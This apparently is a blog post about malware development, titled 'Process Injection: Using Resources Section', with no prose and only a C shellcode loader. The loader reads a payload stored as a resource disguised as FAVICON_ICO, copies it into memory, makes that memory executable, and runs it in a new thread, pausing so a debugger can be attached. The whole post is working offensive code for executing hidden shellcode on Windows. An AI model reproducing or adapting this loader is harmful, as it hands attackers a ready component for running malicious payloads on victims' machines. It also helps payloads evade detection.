---
layout: post
title: "Process Injection: Using Resources Section (NOT OPSEC)"
date: 2026-08-31
---
# Process Injection: Using Resources Section (NOT OPSEC)



```c
#include "resources.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>


int main () {
    HRSRC hResource;
    HGLOBAL hResourceData;
    void *pResourceData;
    unsigned int dwResourceSize;
    void *memoryBuffer;
    BOOL exec_priv = 0;
    DWORD lpflOldProtect = 0;

    hResource = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    hResourceData = LoadResource(NULL, hResource);
    pResourceData = LockResource(hResourceData);
    dwResourceSize = SizeofResource(NULL, hResource);

    memoryBuffer = VirtualAlloc(0, dwResourceSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    RtlMoveMemory(memoryBuffer, pResourceData, dwResourceSize);

    exec_priv = VirtualProtect(memoryBuffer, dwResourceSize, PAGE_EXECUTE_READ, &lpflOldProtect);

    printf("MEMORY BUFFER : 0x%-016p\n", memoryBuffer);
    printf("SHELLCODE : 0x%-016p\n", (void *)pResourceData);
    printf("[*] Attach the debugger\n");
    getchar();

    if (exec_priv != 0) {
        HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)memoryBuffer, 0, 0, 0);
        WaitForSingleObject(hThread, INFINITE);
    }

    return 0;
}
```
